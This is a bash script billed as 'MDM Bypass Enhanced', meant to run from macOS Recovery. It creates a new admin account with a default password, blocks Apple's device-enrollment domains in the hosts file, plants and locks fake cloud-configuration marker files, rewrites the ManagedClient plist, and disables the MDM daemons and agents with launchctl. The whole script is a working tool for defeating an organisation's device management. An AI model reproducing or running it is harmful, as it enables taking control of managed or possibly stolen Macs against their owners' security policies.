#!/bin/bash

# Define color codes
RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
PUR='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m'

# Error handling function
error_exit() {
	echo -e "${RED}ERROR: $1${NC}" >&2
	exit 1
}

# Warning function
warn() {
	echo -e "${YEL}WARNING: $1${NC}"
}

# Success function
success() {
	echo -e "${GRN}✓ $1${NC}"
}

# Info function
info() {
	echo -e "${BLU}ℹ $1${NC}"
}

# Validation functions
validate_username() {
	local username="$1"
	if [ -z "$username" ] || [ ${#username} -gt 31 ] || ! [[ "$username" =~ ^[a-zA-Z0-9_-]+$ ]] || ! [[ "$username" =~ ^[a-zA-Z_] ]]; then return 1; fi
	return 0
}

validate_password() {
	local password="$1"
	if [ -z "$password" ] || [ ${#password} -lt 4 ]; then return 1; fi
	return 0
}

check_user_exists() {
	local dscl_path="$1"
	local username="$2"
	dscl -f "$dscl_path" localhost -read "/Local/Default/Users/$username" 2>/dev/null > /dev/null
}

find_available_uid() {
	local dscl_path="$1"
	local uid=501
	while [ $uid -lt 600 ]; do
		if ! dscl -f "$dscl_path" localhost -search /Local/Default/Users UniqueID $uid 2>/dev/null | grep -q "UniqueID"; then
			echo $uid
			return 0
		fi
		uid=$((uid + 1))
	done
	echo "501"
}

# Detection Logic (Restored to stable strategy)
detect_volumes() {
	local system_vol=""
	local data_vol=""
	for vol in /Volumes/*; do
		if [ -d "$vol/System" ] && [[ ! $(basename "$vol") =~ "Data"$ ]] && [[ ! $(basename "$vol") =~ "Recovery" ]]; then
			system_vol=$(basename "$vol"); break
		fi
	done
	if [ -d "/Volumes/Data" ]; then data_vol="Data"
	elif [ -n "$system_vol" ] && [ -d "/Volumes/$system_vol - Data" ]; then data_vol="$system_vol - Data"
	fi
	echo "$system_vol|$data_vol"
}

# Start Process
volume_info=$(detect_volumes)
system_volume=$(echo "$volume_info" | cut -d'|' -f1)
data_volume=$(echo "$volume_info" | cut -d'|' -f2)

[ -z "$system_volume" ] || [ -z "$data_volume" ] && error_exit "Could not detect macOS volumes."

echo -e "${CYAN}╔═══════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║             MDM Bypass Enhanced               ║${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════════╝${NC}"
success "System: $system_volume"
success "Data: $data_volume"

PS3='Please enter your choice: '
options=("Bypass MDM from Recovery" "Reboot & Exit")
select opt in "${options[@]}"; do
	case $opt in
	"Bypass MDM from Recovery")
		# 1. FileVault Check (Derived from automated decryption research)
		info "Verifying volume availability..."
		if ! diskutil mount "$data_volume" 2>/dev/null; then
			warn "Data volume is locked (FileVault). Use login password to unlock."
			diskutil apfs unlockVolume "$data_volume" || error_exit "Failed to unlock."
		fi

		# Normalize names
		[ "$data_volume" != "Data" ] && diskutil rename "$data_volume" "Data" 2>/dev/null && data_volume="Data"

		system_path="/Volumes/$system_volume"
		data_path="/Volumes/Data"
		dscl_path="$data_path/private/var/db/dslocal/nodes/Default"

		# 2. User Creation
		echo -e "\n${CYAN}Account Configuration${NC}"
		read -p "Fullname [Apple]: " realName; realName="${realName:=Apple}"
		while true; do
			read -p "Username [Apple]: " username; username="${username:=Apple}"
			validate_username "$username" && break
			warn "Invalid username."
		done
		while true; do
			read -p "Password [1234]: " passw; passw="${passw:=1234}"
			validate_password "$passw" && break
			warn "Password too short."
		done

		available_uid=$(find_available_uid "$dscl_path")
		dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username"
		dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UserShell "/bin/zsh"
		dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" RealName "$realName"
		dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UniqueID "$available_uid"
		dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" PrimaryGroupID "20"
		mkdir -p "$data_path/Users/$username"
		dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" NFSHomeDirectory "/Users/$username"
		dscl -f "$dscl_path" localhost -passwd "/Local/Default/Users/$username" "$passw"
		dscl -f "$dscl_path" localhost -append "/Local/Default/Groups/admin" GroupMembership "$username"
		touch "$data_path/private/var/db/.AppleSetupDone"
		success "Admin account created."

		# 3. Domain Redirection (Anti-VPN logic)
		info "Blocking MDM domains..."
		hosts_file="$system_path/etc/hosts"
		domains=("deviceenrollment.apple.com" "mdmenrollment.apple.com" "iprofiles.apple.com" "gdmf.apple.com" "acmdm.apple.com" "albert.apple.com")
		for domain in "${domains[@]}"; do
			grep -q "$domain" "$hosts_file" 2>/dev/null || echo "0.0.0.0 $domain" >> "$hosts_file"
			grep -q ":: $domain" "$hosts_file" 2>/dev/null || echo ":: $domain" >> "$hosts_file"
		done
		chflags uchg "$hosts_file" 2>/dev/null

		# 4. Markers and Plist Modification (Persistence logic)
		config_path="$system_path/var/db/ConfigurationProfiles/Settings"
		mkdir -p "$config_path" 2>/dev/null
		rm -rf "$config_path"/.cloudConfig* 2>/dev/null
		markers=(".cloudConfigProfileInstalled" ".cloudConfigRecordNotFound" ".cloudConfigRecordFound" ".cloudConfigHasActivationRecord" ".cloudConfigNoActivationRecord" ".cloudConfigUserSkippedEnrollment" ".CloudConfigDelete")
		for marker in "${markers[@]}"; do
			chflags nouchg "$config_path/$marker" 2>/dev/null
			touch "$config_path/$marker" 2>/dev/null
			chflags uchg "$config_path/$marker" 2>/dev/null
		done

		# 5. Daemon Suppression (System-level switch)
		disable_flag="$system_path/var/db/.com.apple.mdmclient.daemon.forced_disable"
		chflags nouchg "$disable_flag" 2>/dev/null
		touch "$disable_flag" 2>/dev/null
		chflags uchg "$disable_flag" 2>/dev/null

		# 6. Direct Plist Modification (Configuration parity)
		managed_client_plist="$config_path/com.apple.ManagedClient.plist"
		[ ! -f "$managed_client_plist" ] && echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict></dict></plist>' > "$managed_client_plist"
		for key in "CloudConfigRecordFound" "CloudConfigHasActivationRecord" "CloudConfigProfileInstalled"; do
			/usr/libexec/PlistBuddy -c "Set :$key false" "$managed_client_plist" 2>/dev/null || /usr/libexec/PlistBuddy -c "Add :$key bool false" "$managed_client_plist"
		done
		chflags uchg "$managed_client_plist" 2>/dev/null

		# 7. Service Disablement (Layered suppression)
		info "Disabling MDM service agents and daemons..."
		
		# User-level agent suppression
		USER_IDS=$(dscl -f "$dscl_path" localhost -list /Local/Default/Users UniqueID 2>/dev/null | awk '$2>=501 {print $2}')
		for USER_ID in $USER_IDS; do
			launchctl disable "gui/${USER_ID}/com.apple.ManagedClientAgent.enrollagent" 2>/dev/null || true
			launchctl bootout  "gui/${USER_ID}/com.apple.ManagedClientAgent.enrollagent" 2>/dev/null || true
			launchctl disable "user/${USER_ID}/com.apple.ManagedClientAgent.enrollagent" 2>/dev/null || true
			launchctl bootout  "user/${USER_ID}/com.apple.ManagedClientAgent.enrollagent" 2>/dev/null || true
		done

		# System-level daemon suppression
		services=(
			"com.apple.ManagedClient.cloudconfigurationd"
			"com.apple.ManagedClient.daemon"
			"com.apple.ManagedClient.enroll"
		)
		for service in "${services[@]}"; do
			launchctl disable "system/$service" 2>/dev/null || true
			launchctl bootout  "system/$service" 2>/dev/null || true
		done
		success "All MDM services and agents suppressed."

		echo -e "\n${GRN}Bypass Completed Successfully!${NC}"
		break ;;
	"Reboot & Exit")
		reboot; break ;;
	esac
done
